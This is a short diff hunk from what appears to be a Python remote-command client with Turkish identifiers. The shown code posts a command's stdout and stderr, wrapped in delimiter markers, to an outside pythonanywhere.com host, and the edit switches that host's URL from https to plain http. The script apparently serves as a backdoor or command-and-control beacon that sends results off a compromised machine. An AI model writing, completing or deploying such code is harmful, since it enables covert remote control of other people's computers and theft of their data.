@@ -35,6 +35,6 @@ class nesne:
         req.urlopen(self.url,data=b"<-|->\n" + cikti.stdout + b">-|-<\n" + cikti.stderr + b">-!-<\n")
 
 if __name__ == "__main__":
-    url = "https://gghjhgfjh.pythonanywhere.com"
+    url = "http://gghjhgfjh.pythonanywhere.com"
     n = nesne(url)
     n.kos()
